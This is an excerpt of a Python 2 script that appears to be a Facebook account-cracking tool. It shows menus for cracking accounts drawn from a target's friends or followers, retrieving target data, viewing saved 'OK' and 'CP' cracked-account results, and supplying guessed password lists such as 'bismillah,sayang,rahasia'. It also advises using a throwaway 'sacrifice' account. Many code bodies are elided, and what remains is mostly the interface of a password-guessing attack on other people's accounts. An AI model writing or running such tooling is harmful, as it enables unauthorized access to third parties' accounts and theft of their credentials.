...
def Me():
      ...
      print("""
\x1b[1;97m         ##      ##
\x1b[1;97m         ##      ##            |\x1b[1;96m® \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;90mMantalstudio 
\x1b[1;97m         ##########            |\x1b[1;96m® \x1b[1;97mYoutube \x1b[1;91m: \x1b[1;92mMantalstudio 
\x1b[1;97m         ##      ##            |\x1b[1;96m® \x1b[1;97mGithub  \x1b[1;91m: \x1b[1;97m/Mantalstudio 
\x1b[1;97m         ##      ##            |\x1b[1;96m® \x1b[1;97mVersion \x1b[1;91m: \x1b[1;90m4.0
                       """)
...
def tokenz():
	...
	try:
		...
		os.system('clear')
		Me()
                Xenzi('\x1b[1;97m[\x1b[1;92m!\x1b[1;97m] It is recommended to use an New account \x1b[1;92msacrifice\x1b[1;90m/\x1b[1;92mBro')
...
#        user = db['user premium']
    ...
    print("")
    Xenzi("\x1b[0;97m[\x1b[0;92m1\x1b[0;97m] Crack From Public Friends \x1b[0;97m[\x1b[1;92mPro\x1b[0;97m]")
    Xenzi("\x1b[0;97m[\x1b[0;92m2\x1b[0;97m] Crack From Total Followers \x1b[0;97m[\x1b[1;92mPro\x1b[0;97m]")
#    Xenzi("\x1b[0;97m[\x1b[0;92m3\x1b[0;97m] Crack From Like Posts \x1b[0;97m[\x1b[1;92mPro\x1b[0;97m]")
    Xenzi("\x1b[0;97m[\x1b[0;92m3\x1b[0;97m] Retrieve \x1b[1;91mTarget Data \x1b[0;97m[\x1b[1;92mPro\x1b[0;97m]")
#    print("[5] Dump ID From Friends [Pro1]")
#    print("[6] Dump ID From Public [Pro1]")
#    print("[7] Dump ID of Total followers [Pro1]")
#    print("[8] Start Crack [File] [Pro]")
    Xenzi("\x1b[0;97m[\x1b[0;92m4\x1b[0;97m] View Crack Results \x1b[1;97m[\x1b[1;92mPro\x1b[1;97m]")
    Xenzi("\x1b[0;97m[\x1b[0;91m0\x1b[0;97m] Log out \x1b[1;90m( \x1b[1;91mDeleteToken \x1b[1;90m)")
    pilih_menumbasic()


def pilih_menumbasic():
    ask = raw_input('\n\x1b[1;97m[\x1b[1;92m•\x1b[1;97m] choose \x1b[1;91m:\x1b[1;92m ')
    print""
    if ask == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Choose the Right One!'
        time.sleep(2)
        menu()
        ...
        if  status == 'offline' or status =='Offline':
             Xenzi("\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Sorry Server is Offline!")
             exit()
        else:
             print("\x1b[1;97m[\x1b[1;93m•\x1b[1;97m] Contents \x1b[1;92m'me' \x1b[1;97mIf you want to crack from friends list")
        idt = raw_input('\x1b[1;97m[\x1b[1;93m•\x1b[1;97m] Enter Target ID \x1b[1;97m:\x1b[1;92m ')
        print ""
        try:
        ...
        status = requests.get(bot).text
        if  status == 'offline' or status =='Offline':
             Xenzi("\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Server offline!")
             exit()
        else:
             print("\x1b[1;97m[\x1b[1;93m•\x1b[1;97m] Contents \x1b[1;92m'me' \x1b[1;97mIf you want to crack from friends list")
        idt = raw_input('\x1b[1;97m[\x1b[1;93m•\x1b[1;97m] Enter Target ID \x1b[1;97m:\x1b[1;92m ')
        ...
        if  status == 'offline' or status =='Offline':
             ...
             print ("\x1b[1;97m[\x1b[1;93m•\x1b[1;97m] Enter Target Id")
        date_target()
    elif ask == '04' or ask == '4':
        print'\n[1] Crack Results OK '
        print'[2] Crack Results CP '
        ress = raw_input('\n[?] Pilih : ')
        if ress == '':
            menu()
        elif ress == '01' or ress == '1':
            try:
               totalok = open('Result/OK-%s-%s-%s.txt' % (ha, op, ta)).read().splitlines()
               print '[•] OK Result Date : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
               print("%s"%(H))
               os.system('  Print Result/OK-%s-%s-%s.txt' % (ha, op, ta))
               print ("\n")
            ...
            try:
               ...
               print '\n[•] CP Results Date : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
               print("%s"%(K))
               os.system('  Paint Result/CP-%s-%s-%s.txt' % (ha, op, ta))
               print("\n")
        ...
        os.system('rm -f login.txt')
        Xenzi("[✓] Successfully Deleting Token √√")
        exit()
    else:
        print'[!] Choose the Right One!'
        menu()
    ask = raw_input('[?] Do you want to create a manual password? Y/n: ')
    if ask == 'Y' or ask == 'y':
        manualmbasic()

    print '\n[•] OK Result Saved In : Results/OK-%s-%s-%s.txt' % (ha, op, ta)
    print "[•] CP Results Saved In : Results/CP-%s-%s-%s.txt" % (ha, op, ta)
    print("\n[!]to stop press CTRL then press Z")
    print("")
...
def manualmbasic():
    print '\n[•] Create Example Password : bismillah,sayang,rahasia'
    pw = raw_input('[?] Buat Password : ').split(',')
    if len(pw) == 0:
        exit('[!] Correct Content, Cannot Be Empty!')
    print '\n[•] OK Results Saved In : Results/OK-%s-%s-%s.txt' % (ha, op, ta)
    print '[•] CP Results Saved In : Results/CP-%s-%s-%s.txt' % (ha, op, ta)
    print("\n[!] To stop press CTRL then press Z ")
    print("")
